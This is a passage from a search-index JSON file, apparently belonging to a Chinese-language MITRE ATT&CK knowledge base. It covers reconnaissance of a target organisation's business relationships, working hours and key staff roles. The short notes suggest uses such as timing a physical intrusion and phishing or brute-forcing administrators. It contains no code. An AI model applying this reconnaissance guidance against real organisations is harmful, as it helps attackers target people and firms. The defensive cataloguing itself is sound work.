https://attack.mitre.org/techniques/T1591/002/","title":"T1591-002-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u4e1a\u52a1\u5173\u7cfb"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#t1591-002-","text":"","title":"T1591-002-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u4e1a\u52a1\u5173\u7cfb"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u7684\u4e1a\u52a1\u5173\u7cfb\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u5728\u76ee\u6807\u786e\u5b9a\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u7ec4\u7ec7\u4e1a\u52a1\u5173\u7cfb\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u5df2\u8fde\u63a5\uff08\u5e76\u53ef\u80fd\u63d0\u5347\u4e86\uff09\u7f51\u7edc\u8bbf\u95ee\u6743\u9650\u7684\u7b2c\u4e8c\u6216\u7b2c\u4e09\u65b9\u7ec4\u7ec7\u6216\u57df\uff08\u4f8b\u5982\uff1a\u6258\u7ba1\u670d\u52a1\u63d0\u4f9b\u5546\uff0c\u627f\u5305\u5546\u7b49\uff09\u3002\u6b64\u4fe1\u606f\u8fd8\u53ef\u80fd\u63ed\u793a\u53d7\u5bb3\u8005\u7684\u786c\u4ef6\u548c\u8f6f\u4ef6\u8d44\u6e90\u7684\u4f9b\u5e94\u94fe\u548c\u8fd0\u9001\u8def\u5f84\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u201c\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u201d\u76f4\u63a5\u8bf1\u6355\u3002\u6709\u5173\u4e1a\u52a1\u5173\u7cfb\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u4f1a\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff0c\u793e\u4ea4\u5a92\u4f53\u6216\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u6b64\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u4ee5\u83b7\u53d6\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9\u6216\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u5e10\u6237\u6216\u635f\u5bb3\u5e10\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u59a5\u534f\uff0c\u9a71\u52a8\u5f0f\u59a5\u534f\uff0c\u6216\u201c\u4fe1\u4efb\u5173\u7cfb\u201d\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_1","text":"\u4f8b\u5982\u53d7\u5bb3\u8005\u7684\u4e2a\u4eba\u793e\u4ea4\u4fe1\u606f\uff0c\u5fae\u535a\u3001\u5fae\u4fe1\u3001QQ\u7b49\u3002 \u4f8b\u5982\u53d7\u5bb3\u7ec4\u7ec7\u7684\u4e0a\u4e0b\u6e38\u5173\u7cfb\uff0c\u6bd4\u5982\u6bcd\u5b50\u516c\u53f8\u5173\u7cfb\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_7","text":"MITRE-ATT&CK-T1591-002 https://attack.mitre.org/techniques/T1591/002/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/","text":"T1591-003-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u786e\u5b9a\u4e1a\u52a1\u8282\u594f \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u4e0e\u53d7\u5bb3\u8005\u7684\u4e1a\u52a1\u8282\u594f\u6709\u5173\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u5b9a\u4f4d\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u3002\u6709\u5173\u7ec4\u7ec7\u4e1a\u52a1\u8282\u594f\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u6bcf\u5468\u7684\u5de5\u4f5c\u65f6\u95f4/\u5929\u3002\u6b64\u4fe1\u606f\u8fd8\u53ef\u80fd\u663e\u793a\u53d7\u5bb3\u8005\u7684\u786c\u4ef6\u548c\u8f6f\u4ef6\u8d44\u6e90\u7684\u8d2d\u4e70\u548c\u8fd0\u8f93\u65f6\u95f4/\u65e5\u671f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u201c\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u201d\u76f4\u63a5\u8bf1\u6355\u3002\u6709\u5173\u4e1a\u52a1\u8282\u594f\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u4f1a\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff0c\u793e\u4ea4\u5a92\u4f53\u6216\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u6b64\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u4ee5\u83b7\u53d6\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u5e10\u6237\u6216\u635f\u5bb3\u5e10\u6237\uff09\u548c/\u6216\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u5173\u7cfb\u6216\u4fe1\u4efb\u5173\u7cfb\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4e2a\u4eba\u7406\u89e3\uff1a\u6b64\u6280\u672f\u53ef\u80fd\u5728\u793e\u5de5\u524d\u671f\u4f7f\u7528\uff0c\u89c2\u5bdf\u53d7\u5bb3\u8005\u4e0a\u4e0b\u73ed\u65f6\u95f4\u3001\u8f66\u8f86\u8fdb\u5165\u60c5\u51b5\uff0c\u4e3a\u540e\u7eed\u7269\u7406\u5165\u4fb5\u63d0\u4f9b\u4e00\u4e9b\u5e2e\u52a9\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1591-003 https://attack.mitre.org/techniques/T1591/003/","title":"T1591-003-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u786e\u5b9a\u4e1a\u52a1\u8282\u594f"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#t1591-003-","text":"","title":"T1591-003-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u786e\u5b9a\u4e1a\u52a1\u8282\u594f"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u4e0e\u53d7\u5bb3\u8005\u7684\u4e1a\u52a1\u8282\u594f\u6709\u5173\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u5b9a\u4f4d\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u3002\u6709\u5173\u7ec4\u7ec7\u4e1a\u52a1\u8282\u594f\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u6bcf\u5468\u7684\u5de5\u4f5c\u65f6\u95f4/\u5929\u3002\u6b64\u4fe1\u606f\u8fd8\u53ef\u80fd\u663e\u793a\u53d7\u5bb3\u8005\u7684\u786c\u4ef6\u548c\u8f6f\u4ef6\u8d44\u6e90\u7684\u8d2d\u4e70\u548c\u8fd0\u8f93\u65f6\u95f4/\u65e5\u671f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u201c\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u201d\u76f4\u63a5\u8bf1\u6355\u3002\u6709\u5173\u4e1a\u52a1\u8282\u594f\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u4f1a\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff0c\u793e\u4ea4\u5a92\u4f53\u6216\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u6b64\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u4ee5\u83b7\u53d6\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u5e10\u6237\u6216\u635f\u5bb3\u5e10\u6237\uff09\u548c/\u6216\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u5173\u7cfb\u6216\u4fe1\u4efb\u5173\u7cfb\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_1","text":"\u4e2a\u4eba\u7406\u89e3\uff1a\u6b64\u6280\u672f\u53ef\u80fd\u5728\u793e\u5de5\u524d\u671f\u4f7f\u7528\uff0c\u89c2\u5bdf\u53d7\u5bb3\u8005\u4e0a\u4e0b\u73ed\u65f6\u95f4\u3001\u8f66\u8f86\u8fdb\u5165\u60c5\u51b5\uff0c\u4e3a\u540e\u7eed\u7269\u7406\u5165\u4fb5\u63d0\u4f9b\u4e00\u4e9b\u5e2e\u52a9\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_7","text":"MITRE-ATT&CK-T1591-003 https://attack.mitre.org/techniques/T1591/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/","text":"T1591-004-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u786e\u5b9a\u89d2\u8272 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u76ee\u6807\u7ec4\u7ec7\u4e2d\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u7ec4\u7ec7\u5185\u7684\u8eab\u4efd\u548c\u89d2\u8272\u7684\u4fe1\u606f\u3002\u6709\u5173\u4e1a\u52a1\u89d2\u8272\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63ed\u793a\u5404\u79cd\u53ef\u9488\u5bf9\u6027\u7684\u7ec6\u8282\uff0c\u5305\u62ec\u5173\u952e\u4eba\u5458\u7684\u53ef\u8bc6\u522b\u4fe1\u606f\u4ee5\u53ca\u4ed6\u4eec\u53ef\u4ee5\u8bbf\u95ee\u54ea\u4e9b\u6570\u636e/\u8d44\u6e90\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u201c\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u201d\u76f4\u63a5\u8bf1\u6355\u3002\u6709\u5173\u4e1a\u52a1\u89d2\u8272\u7684\u4fe1\u606f\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff0c\u793e\u4ea4\u5a92\u4f53\u6216\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u6b64\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u4ee5\u83b7\u53d6\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u5e10\u6237\u6216\u7834\u574f\u5e10\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4e2a\u4eba\u7406\u89e3\uff1a\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u8fd0\u7ef4\u3001\u7f51\u7edc\u7ba1\u7406\u5458\u76f8\u5173\u4fe1\u606f\uff0c\u540e\u7eed\u53ef\u4ee5\u8fdb\u884c\u7cbe\u51c6\u793e\u5de5\uff0c\u6216\u8005\u76f8\u5173\u4eba\u5458\u7684\u8d26\u53f7\u5bc6\u7801\u7206\u7834\uff0c\u4e5f\u53ef\u80fd\u662f\u53d1\u9001\u53d7\u5bb3\u8005\u611f\u5174\u8da3\u7684\u90ae\u4ef6\uff0c\u5b9e\u73b0\u90ae\u4ef6\u9493\u9c7c\u7b49\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1591-004 https://attack.mitre.org/techniques/T1591/004/","title":"T1591-004-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u786e\u5b9a\u89d2\u8272"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#t1591-004-","text":"","title":"T1591-004-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u786e\u5b9a\u89d2\u8272"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u76ee\u6807\u7ec4\u7ec7\u4e2d\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u7ec4\u7ec7\u5185\u7684\u8eab\u4efd\u548c\u89d2\u8272\u7684\u4fe1\u606f\u3002\u6709\u5173\u4e1a\u52a1\u89d2\u8272\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63ed\u793a\u5404\u79cd\u53ef\u9488\u5bf9\u6027\u7684\u7ec6\u8282\uff0c\u5305\u62ec\u5173\u952e\u4eba\u5458\u7684\u53ef\u8bc6\u522b\u4fe1\u606f\u4ee5\u53ca\u4ed6\u4eec\u53ef\u4ee5\u8bbf\u95ee\u54ea\u4e9b\u6570\u636e/\u8d44\u6e90\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u201c\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u201d\u76f4\u63a5\u8bf1\u6355\u3002\u6709\u5173\u4e1a\u52a1\u89d2\u8272\u7684\u4fe1\u606f\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff0c\u793e\u4ea4\u5a92\u4f53\u6216\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u6b64\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u4ee5\u83b7\u53d6\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u5e10\u6237\u6216\u7834\u574f\u5e10\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_1","text":"\u4e2a\u4eba\u7406\u89e3\uff1a\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u8fd0\u7ef4\u3001\u7f51\u7edc\u7ba1\u7406\u5458\u76f8\u5173\u4fe1\u606f\uff0c\u540e\u7e